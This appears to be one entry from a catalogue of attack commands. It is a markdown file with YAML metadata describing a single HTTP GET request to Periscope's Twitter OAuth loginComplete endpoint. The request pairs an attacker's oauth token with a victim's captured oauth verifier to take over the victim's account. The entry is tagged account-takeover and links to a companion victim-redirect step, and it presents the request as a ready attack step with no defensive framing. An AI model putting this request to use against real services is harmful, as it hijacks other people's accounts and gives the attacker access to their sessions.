---
id: cmd-periscope-completion-request
data: >-
  www.periscope.tv/i/twitter/loginComplete?oauth_token=[attacker's oauth
  token]&oauth_verifier=[victim's oauth verifier]
tags:
  - account-takeover
  - oauth
type: command
output: Successful login and account linkage
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.664Z'
verified: false
validated: true
submitted: true
---
# attacker-completion-request

## Command

```http
www.periscope.tv/i/twitter/loginComplete?oauth_token=[attacker's oauth token]&oauth_verifier=[victim's oauth verifier]
```

## Description

Final request using captured tokens to complete OAuth and takeover the account.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| oauth_token | Captured token | Yes |
| oauth_verifier | Captured verifier | Yes |

## Examples

### Basic Usage

Send as GET to Periscope endpoint.

## Expected Output

Authenticated session or dashboard access.

## Related

- [[commands/victim-redirect-url]]
